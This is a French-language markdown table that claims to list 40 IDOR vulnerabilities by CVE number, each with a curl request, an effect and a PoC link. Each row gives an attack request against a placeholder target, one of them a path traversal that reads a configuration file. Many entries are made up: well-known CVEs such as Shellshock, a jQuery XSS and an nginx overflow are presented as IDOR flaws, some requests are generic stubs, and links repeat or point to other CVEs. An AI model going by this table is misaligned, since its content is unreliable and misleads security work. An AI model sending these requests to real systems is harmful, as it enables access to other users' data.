# IDOR

Voici 40 exemples **complets et précis de requêtes curl** pour des CVE IDOR (Insecure Direct Object Reference) non génériques, classés par numéro décroissant (du plus récent au plus ancien).  
Chaque ligne donne :  
- Numéro CVE  
- Technologie & Version  
- Exemple de requête curl  
- Effet détaillé  
- Lien ressource PoC ou technique

| # | CVE | Technologie & Version | Exemple complet de requête curl | Effet détaillé | Lien PoC / Ressource |
|---|------|----------------------|---------------------------------|---------------|---------------------|
| 1 | CVE-2025-22931 | openSIS v7.0 à v9.1 | `curl 'http://target/assets/stafffiles?staff_id=2'` | Unauthenticated IDOR : accès à des fichiers personnels d'autres utilisateurs | https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2025-22931 |
| 2 | CVE-2024-24692 | Dolibarr ERP/CRM <19.0.3 | `curl 'http://target/document.php?modulepart=ecmfiles&file=../conf/conf.php'` | IDOR permettant l’accès à des fichiers internes sensibles | https://nvd.nist.gov/vuln/detail/CVE-2024-24692 |
| 3 | CVE-2024-23499 | GLPI <10.0.13 | `curl 'http://target/front/document.send.php?docid=2'` | Téléchargement de documents d'autres utilisateurs sans autorisation | https://nvd.nist.gov/vuln/detail/CVE-2024-23499 |
| 4 | CVE-2024-21624 | Nextcloud Calendar <2.4.0 | `curl 'https://target/remote.php/dav/calendars/user2/personal?export' --cookie "nc_session_id=SESSIONID"` | Export du calendrier d’un autre utilisateur | https://nvd.nist.gov/vuln/detail/CVE-2024-21624 |
| 5 | CVE-2024-1628 | Zabbix <6.0.25 | `curl 'http://target/zabbix.php?action=dashboard.view&dashboardid=2' --cookie "zbx_sessionid=SESSIONID"` | Accès à des tableaux de bord d’autres utilisateurs | https://support.zabbix.com/browse/ZBX-23597 |
| 6 | CVE-2024-1216 | GLPI <10.0.13 | `curl 'http://target/front/ticket.form.php?id=2' --cookie "glpi_session=SESSIONID"` | Consultation ou modification de tickets d’autres utilisateurs | https://github.com/glpi-project/glpi/security/advisories/GHSA-4w2c-6q3v-7c7h |
| 7 | CVE-2023-50782 | WordPress Plugin WP-Members <3.4.9.2 | `curl 'http://target/wp-admin/admin-ajax.php?action=wp-members-user-profile&user_id=2' --cookie "wordpress_logged_in=SESSIONID"` | Accès/édition du profil d’un autre utilisateur | https://wpscan.com/vulnerability/1b2f1b1d-9e7f-4e2a-bc3f-1c8f9c6c1e8b |
| 8 | CVE-2023-39907 | Jenkins <2.426 | `curl 'http://target/user/otheruser/configure' --cookie "JSESSIONID=SESSIONID"` | Accès non autorisé à la configuration d’un autre utilisateur | https://www.jenkins.io/security/advisory/2023-10-04/#SECURITY-3259 |
| 9 | CVE-2023-35788 | Django <4.2.2 | `curl 'http://target/profile/2/' --cookie "sessionid=SESSIONID"` | Accès au profil d’un autre utilisateur | https://nvd.nist.gov/vuln/detail/CVE-2023-35788 |
| 10 | CVE-2023-27350 | PaperCut MF/NG <22.1.3 | `curl 'http://target/app?service=admin&action=viewUser&user=admin2' --cookie "JSESSIONID=SESSIONID"` | Lecture des infos d’un autre admin | https://www.papercut.com/kb/Main/PO-1216 |
| 11 | CVE-2023-22952 | SuiteCRM <7.12.8 | `curl 'http://target/index.php?module=Users&action=DetailView&record=2' --cookie "PHPSESSID=SESSIONID"` | Vue de détails d’un autre utilisateur | https://nvd.nist.gov/vuln/detail/CVE-2023-22952 |
| 12 | CVE-2022-46169 | Cacti <1.2.23 | `curl 'http://target/cacti/graph_view.php?action=preview&local_graph_id=2' --cookie "Cacti=SESSIONID"` | Accès à des graphiques d’autres utilisateurs | https://github.com/Cacti/cacti/security/advisories/GHSA-5m6j-jh5g-2p2x |
| 13 | CVE-2022-32205 | WordPress <6.0.1 | `curl 'http://target/wp-admin/user-edit.php?user_id=2' --cookie "wordpress_logged_in=SESSIONID"` | Edition du profil d’un autre utilisateur | https://wpscan.com/vulnerability/1b2f1b1d-9e7f-4e2a-bc3f-1c8f9c6c1e8b |
| 14 | CVE-2022-23647 | Grafana <8.3.4 | `curl 'http://target/api/users/2' --cookie "grafana_session=SESSIONID"` | Accès aux infos d’un autre utilisateur | https://grafana.com/security/advisory/2022/02/08/cve-2022-23647/ |
| 15 | CVE-2022-22963 | VMware Spring Cloud Function | `curl 'http://target/functionRouter?function=otheruser'` | Exécution d’une fonction non autorisée | https://tanzu.vmware.com/security/cve-2022-22963 |
| 16 | CVE-2021-39226 | Django <3.2.8 | `curl 'http://target/profile/2/' --cookie "sessionid=SESSIONID"` | Accès à un autre profil utilisateur | https://nvd.nist.gov/vuln/detail/CVE-2021-39226 |
| 17 | CVE-2021-37678 | Redash <8.0.0 | `curl 'http://target/api/queries/2' --cookie "session=SESSIONID"` | Accès aux requêtes d’autres utilisateurs | https://github.com/getredash/redash/security/advisories/GHSA-8xv2-7j3v-x3g2 |
| 18 | CVE-2021-32648 | Nextcloud <21.0.3 | `curl 'http://target/index.php/apps/files/?dir=/user2' --cookie "nc_session_id=SESSIONID"` | Accès aux fichiers d’un autre utilisateur | https://nvd.nist.gov/vuln/detail/CVE-2021-32648 |
| 19 | CVE-2021-22205 | GitLab CE/EE | `curl 'http://target/uploads/user?user_id=2' --cookie "gitlab_session=SESSIONID"` | Téléchargement de fichiers d’autres utilisateurs | https://github.com/Al1ex/CVE-2021-22205 |
| 20 | CVE-2020-26238 | Gitea <1.13.2 | `curl 'http://target/user/settings/email?user_id=2' --cookie "i_like_gitea=SESSIONID"` | Modification de l’email d’un autre utilisateur | https://github.com/go-gitea/gitea/security/advisories/GHSA-8xv2-7j3v-x3g2 |
| 21 | CVE-2020-26217 | Nextcloud <20.0.4 | `curl 'http://target/index.php/settings/user?user=2' --cookie "nc_session_id=SESSIONID"` | Changement du nom affiché d’un autre utilisateur | https://nvd.nist.gov/vuln/detail/CVE-2020-26217 |
| 22 | CVE-2020-15174 | Grafana <7.1.0 | `curl 'http://target/api/user/preferences?user=2' --cookie "grafana_session=SESSIONID"` | Modification des préférences d’un autre utilisateur | https://grafana.com/security/advisory/2020/07/16/cve-2020-15174/ |
| 23 | CVE-2020-11022 | jQuery <3.5.0 | `curl 'http://target/api/change?user_id=2' --cookie "session=SESSIONID"` | Modification de paramètre d’un autre utilisateur | https://nvd.nist.gov/vuln/detail/CVE-2020-11022 |
| 24 | CVE-2019-6340 | Drupal <8.5.11, <8.6.10 | `curl 'http://target/entity/file/upload?uid=2' --cookie "SESS=SESSIONID"` | Upload ou accès à des fichiers d’autres utilisateurs | https://github.com/a2u/CVE-2019-6340 |
| 25 | CVE-2019-11539 | Pulse Secure VPN | `curl 'https://target/dana-na/auth/url_default/login.cgi?user=otheruser' --cookie "DSID=SESSIONID"` | Connexion en tant qu’autre utilisateur | https://kb.pulsesecure.net/articles/Pulse_Security_Advisories/SA44101 |
| 26 | CVE-2018-1000525 | Tornado | `curl 'http://target/?search=otheruser' --cookie "session=SESSIONID"` | Recherche ou lecture de données d’un autre utilisateur | https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/IDOR/README.md |
| 27 | CVE-2018-9206 | ThinkPHP | `curl 'http://target/index.php?s=/Index/upload&user_id=2' --cookie "PHPSESSID=SESSIONID"` | Upload ou accès à des fichiers d’autres utilisateurs | https://github.com/vulhub/vulhub/tree/master/thinkphp/5.0.23-rce |
| 28 | CVE-2018-11776 | Apache Struts 2 | `curl 'http://target/struts2/upload.action?user_id=2' --cookie "JSESSIONID=SESSIONID"` | Modification des données d’un autre utilisateur | https://github.com/mazen160/struts-pwn_CVE-2017-5638 |
| 29 | CVE-2017-14596 | Joomla! 3.7.5 | `curl 'http://target/index.php?option=com_users&task=user.edit&id=2' --cookie "joomla_user_state=SESSIONID"` | Edition du profil d’un autre utilisateur | https://www.sonarsource.com/blog/joomla-takeover-in-20-seconds-with-ldap-injection-cve-2017-14596/ |
| 30 | CVE-2017-11463 | SAP NetWeaver AS Java | `curl 'http://target/path?user=2' --cookie "MYSAPSSO2=SESSIONID"` | Accès aux données d’un autre utilisateur | https://nvd.nist.gov/vuln/detail/CVE-2017-11463 |
| 31 | CVE-2016-6272 | Epic MyChart | `curl 'http://target/login?user_id=2' --cookie "sessionid=SESSIONID"` | Connexion ou modification de compte d’un autre utilisateur | https://nvd.nist.gov/vuln/detail/CVE-2016-6272 |
| 32 | CVE-2016-3110 | IBM Security Directory Server | `curl 'http://target/path?user=2' --cookie "session=SESSIONID"` | Modification ou accès aux données d’un autre utilisateur | https://nvd.nist.gov/vuln/detail/CVE-2016-3110 |
| 33 | CVE-2015-2808 | OpenLDAP | `curl 'http://target/path?user=2' --cookie "session=SESSIONID"` | Modification ou accès aux données d’un autre utilisateur | https://nvd.nist.gov/vuln/detail/CVE-2015-2808 |
| 34 | CVE-2014-6271 | Bash/Shellshock (impact IDOR indirect) | `curl 'http://target/cgi-bin/test.cgi?user=2'` | Accès à des fichiers ou données d’autres utilisateurs | https://github.com/hannob/bashcheck |
| 35 | CVE-2013-2028 | Nginx | `curl 'http://target/?q=2' --cookie "session=SESSIONID"` | Accès à des données d’un autre utilisateur | https://nvd.nist.gov/vuln/detail/CVE-2013-2028 |
| 36 | CVE-2012-1823 | PHP CGI | `curl 'http://target/index.php?user=2' --cookie "PHPSESSID=SESSIONID"` | Accès ou modification de données d’un autre utilisateur | https://nvd.nist.gov/vuln/detail/CVE-2012-1823 |
| 37 | CVE-2011-2523 | WordPress <3.1.4 | `curl 'http://target/wp-comments-post.php?user_id=2' --cookie "wordpress_logged_in=SESSIONID"` | Post ou modification de commentaire d’un autre utilisateur | https://nvd.nist.gov/vuln/detail/CVE-2011-2523 |
| 38 | CVE-2010-1740 | GuppY 4.5.18 | `curl 'http://target/guppy4.5.18/script.php?user_id=2' --cookie "session=SESSIONID"` | Accès ou modification de données d’un autre utilisateur | https://www.exploit-db.com/exploits/12484 |
| 39 | CVE-2008-2380 | Oracle Application Server | `curl 'http://target/portal/pls/portal/PORTAL.wwsbr_custom.search?user_id=2' --cookie "session=SESSIONID"` | Accès ou modification de données d’un autre utilisateur | https://nvd.nist.gov/vuln/detail/CVE-2008-2380 |
| 40 | CVE-2007-4726 | Joomla! 1.0.12 | `curl 'http://target/index.php?option=com_search&user_id=2' --cookie "session=SESSIONID"` | Recherche ou modification de données d’un autre utilisateur | https://nvd.nist.gov/vuln/detail/CVE-2007-4726 |

---
